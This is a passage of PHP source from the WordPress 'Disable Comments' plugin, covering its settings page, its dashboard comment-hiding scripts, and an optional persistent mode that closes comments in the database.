			echo '<script> jQuery(function($){ $("#dashboard_right_now .table_discussion").has(\'a[href="edit-comments.php"]\').first().hide(); }); </script>';
		}
		else {
			echo '<script> jQuery(function($){ $("#dashboard_right_now .comment-count, #latest-comments").hide(); }); </script>';
		}
	}

	function filter_comment_status( $open, $post_id ) {
		$post = get_post( $post_id );
		return ( $this->options['remove_everywhere'] || $this->is_post_type_disabled( $post->post_type ) ) ? false : $open;
	}

	function disable_rc_widget() {
		// This widget has been removed from the Dashboard in WP 3.8 and can be removed in a future version
		unregister_widget( 'WP_Widget_Recent_Comments' );
	}

	function set_plugin_meta( $links, $file ) {
		static $plugin;
		$plugin = plugin_basename( __FILE__ );
		if ( $file == $plugin ) {
			$links[] = '<a href="https://github.com/solarissmoke/disable-comments">GitHub</a>';
		}
		return $links;
	}

	/**
	 * Add links to Settings page
	*/
	function plugin_actions_links( $links, $file ) {
		static $plugin;
		$plugin = plugin_basename( __FILE__ );
		if( $file == $plugin && current_user_can('manage_options') ) {
			array_unshift(
				$links,
				sprintf( '<a href="%s">%s</a>', esc_attr( $this->settings_page_url() ), __( 'Settings' ) )
			);
		}

		return $links;
	}

	function settings_menu() {
		$title = __( 'Disable Comments', 'disable-comments' );
		if( $this->networkactive )
			add_submenu_page( 'settings.php', $title, $title, 'manage_network_plugins', 'disable_comments_settings', array( $this, 'settings_page' ) );
		else
			add_submenu_page( 'options-general.php', $title, $title, 'manage_options', 'disable_comments_settings', array( $this, 'settings_page' ) );
	}

	function settings_page() {
		$typeargs = array( 'public' => true );
		if( $this->networkactive ) {
			$typeargs['_builtin'] = true;	// stick to known types for network
		}
		$types = get_post_types( $typeargs, 'objects' );
		foreach( array_keys( $types ) as $type ) {
			if( ! in_array( $type, $this->modified_types ) && ! post_type_supports( $type, 'comments' ) )	// the type doesn't support comments anyway
				unset( $types[$type] );
		}

		$persistent_allowed = $this->persistent_mode_allowed();

		if ( isset( $_POST['submit'] ) ) {
			check_admin_referer( 'disable-comments-admin' );
			$this->options['remove_everywhere'] = ( $_POST['mode'] == 'remove_everywhere' );

			if( $this->options['remove_everywhere'] )
				$disabled_post_types = array_keys( $types );
			else
				$disabled_post_types =  empty( $_POST['disabled_types'] ) ? array() : (array) $_POST['disabled_types'];

			$disabled_post_types = array_intersect( $disabled_post_types, array_keys( $types ) );

			// entering permanent mode, or post types have changed
			if( $persistent_allowed && !empty( $_POST['permanent'] ) && ( !$this->options['permanent'] || $disabled_post_types != $this->options['disabled_post_types'] ) )
				$this->enter_permanent_mode();

			$this->options['disabled_post_types'] = $disabled_post_types;
			$this->options['permanent'] = $persistent_allowed && isset( $_POST['permanent'] );

			// Extra custom post types
			if( $this->networkactive && !empty( $_POST['extra_post_types'] ) ) {
				$extra_post_types = array_filter( array_map( 'sanitize_key', explode( ',', $_POST['extra_post_types'] ) ) );
				$this->options['extra_post_types'] = array_diff( $extra_post_types, array_keys( $types ) );	// Make sure we don't double up builtins
			}

			$this->update_options();
			$cache_message = WP_CACHE ? ' <strong>' . __( 'If a caching/performance plugin is active, please invalidate its cache to ensure that changes are reflected immediately.' ) . '</strong>' : '';
			echo '<div id="message" class="updated"><p>' . __( 'Options updated. Changes to the Admin Menu and Admin Bar will not appear until you leave or reload this page.', 'disable-comments' ) . $cache_message . '</p></div>';
		}
	?>
	<style> .indent {padding-left: 2em} </style>
	<div class="wrap">
	<?php screen_icon( 'plugins' ); ?>
	<h2><?php _e( 'Disable Comments', 'disable-comments') ?></h2>
	<?php
	if( $this->networkactive )
		echo '<div class="updated"><p>' . __( '<em>Disable Comments</em> is Network Activated. The settings below will affect <strong>all sites</strong> in this network.', 'disable-comments') . '</p></div>';
	if( WP_CACHE )
		echo '<div class="updated"><p>' . __( "It seems that a caching/performance plugin is active on this site. Please manually invalidate that plugin's cache after making any changes to the settings below.", 'disable-comments') . '</p></div>';
	?>
	<form action="" method="post" id="disable-comments">
	<ul>
	<li><label for="remove_everywhere"><input type="radio" id="remove_everywhere" name="mode" value="remove_everywhere" <?php checked( $this->options['remove_everywhere'] );?> /> <strong><?php _e( 'Everywhere', 'disable-comments') ?></strong>: <?php _e( 'Disable all comment-related controls and settings in WordPress.', 'disable-comments') ?></label>
		<p class="indent"><?php printf( __( '%s: This option is global and will affect your entire site. Use it only if you want to disable comments <em>everywhere</em>. A complete description of what this option does is <a href="%s" target="_blank">available here</a>.', 'disable-comments' ), '<strong style="color: #900">' . __('Warning', 'disable-comments') . '</strong>', 'http://wordpress.org/extend/plugins/disable-comments/other_notes/' ); ?></p>
	</li>
	<li><label for="selected_types"><input type="radio" id="selected_types" name="mode" value="selected_types" <?php checked( ! $this->options['remove_everywhere'] );?> /> <strong><?php _e( 'On certain post types', 'disable-comments') ?></strong></label>:
		<p></p>
		<ul class="indent" id="listoftypes">
			<?php foreach( $types as $k => $v ) echo "<li><label for='post-type-$k'><input type='checkbox' name='disabled_types[]' value='$k' ". checked( in_array( $k, $this->options['disabled_post_types'] ), true, false ) ." id='post-type-$k'> {$v->labels->name}</label></li>";?>
		</ul>
		<?php if( $this->networkactive ) :?>
		<p class="indent" id="extratypes"><?php _e( 'Only the built-in post types appear above. If you want to disable comments on other custom post types on the entire network, you can supply a comma-separated list of post types below (use the slug that identifies the post type).', 'disable-comments' ); ?>
		<br /><label>Custom post types: <input type="text" name="extra_post_types" size="30" value="<?php echo implode( ', ', (array) $this->options['extra_post_types'] ); ?>" /></label></p>
		<?php endif; ?>
		<p class="indent"><?php _e( 'Disabling comments will also disable trackbacks and pingbacks. All comment-related fields will also be hidden from the edit/quick-edit screens of the affected posts. These settings cannot be overridden for individual posts.', 'disable-comments') ?></p>
	</li>
	</ul>

	<?php if( $persistent_allowed ): ?>
	<h3><?php _e( 'Other options', 'disable-comments') ?></h3>
	<ul>
		<li>
		<?php
		echo '<label for="permanent"><input type="checkbox" name="permanent" id="permanent" '. checked( $this->options['permanent'], true, false ) . '> <strong>' . __( 'Use persistent mode', 'disable-comments') . '</strong></label>';
		echo '<p class="indent">' . sprintf( __( '%s: <strong>This will make persistent changes to your database &mdash; comments will remain closed even if you later disable the plugin!</strong> You should not use it if you only want to disable comments temporarily. Please <a href="%s" target="_blank">read the FAQ</a> before selecting this option.', 'disable-comments'), '<strong style="color: #900">' . __('Warning', 'disable-comments') . '</strong>', 'http://wordpress.org/extend/plugins/disable-comments/faq/' ) . '</p>';
		if( $this->networkactive )
			echo '<p class="indent">' . sprintf( __( '%s: Entering persistent mode on large multi-site networks requires a large number of database queries and can take a while. Use with caution!', 'disable-comments'), '<strong style="color: #900">' . __('Warning', 'disable-comments') . '</strong>' ) . '</p>';
		?>
		</li>
	</ul>
	<?php endif; ?>

	<?php wp_nonce_field( 'disable-comments-admin' ); ?>
	<p class="submit"><input class="button-primary" type="submit" name="submit" value="<?php _e( 'Save Changes') ?>"></p>
	</form>
	</div>
	<script>
	jQuery(document).ready(function($){
		function disable_comments_uihelper(){
			var indiv_bits = $("#listoftypes, #extratypes");
			if( $("#remove_everywhere").is(":checked") )
				indiv_bits.css("color", "#888").find(":input").attr("disabled", true );
			else
				indiv_bits.css("color", "#000").find(":input").attr("disabled", false );
		}

		$("#disable-comments :input").change(function(){
			$("#message").slideUp();
			disable_comments_uihelper();
		});

		disable_comments_uihelper();

		$("#permanent").change( function() {
			if( $(this).is(":checked") && ! confirm(<?php echo json_encode( sprintf( __( '%s: Selecting this option will make persistent changes to your database. Are you sure you want to enable it?', 'disable-comments'), __( 'Warning', 'disable-comments' ) ) );?>) )
				$(this).attr("checked", false );
		});
	});
	</script>
<?php
	}

	private function enter_permanent_mode() {
		$types = $this->get_disabled_post_types();
		if( empty( $types ) )
			return;

		global $wpdb;

		if( $this->networkactive ) {
			// NOTE: this can be slow on large networks!
			$blogs = $wpdb->get_col( $wpdb->prepare( "SELECT blog_id FROM $wpdb->blogs WHERE site_id = %d AND public = '1' AND archived = '0' AND deleted = '0'", $wpdb->siteid ) );

			foreach ( $blogs as $id ) {
				switch_to_blog( $id );
				$this->close_comments_in_db( $types );
				restore_current_blog();
			}
		}
		else {
			$this->close_comments_in_db( $types );
		}
	}

	private function close_comments_in_db( $types ){
		global $wpdb;
		$bits = implode( ', ', array_pad( array(), count( $types ), '%s' ) );
		$wpdb->query( $wpdb->prepare( "UPDATE `$wpdb->posts` SET `comment_status` = 'closed', ping_status = 'closed' WHERE `post_type` IN ( $bits )", $types ) );
	}

	private function persistent_mode_allowed() {
		if( defined( 'DISABLE_COMMENTS_ALLOW_PERSISTENT_MODE' ) && DISABLE_COMMENTS_ALLOW_PERSISTENT_MODE == false ) {
			return false;
		}
		// The filter below is deprecated and will be removed in future versions. Use the define instead.
		return apply_filters( 'disable_comments_allow_persistent_mode', true );
	}

	/* This function should only be used inside an individual site context */
	private function get_disabled_post_types() {
		$types = $this->options['disabled_post_types'];
		// Not all extra_post_types might be registered on this particular site
		if( $this->networkactive ) {
			foreach( (array) $this->options['extra_post_types'] as $extra ) {
				if( post_type_exists( $extra ) ) {
					$types[] = $extra;
				}
			}
		}
		return $types;
	}

	private function is_post_type_disabled( $type ) {
		return in_array( $type, $this->get_disabled_post_types() );
	}

	function single_site_deactivate() {
		// for single sites, delete the options upon deactivation, not uninstall
		delete_option( 'disable_comments_options' );
	}
}

Disable_Comments::get_instance();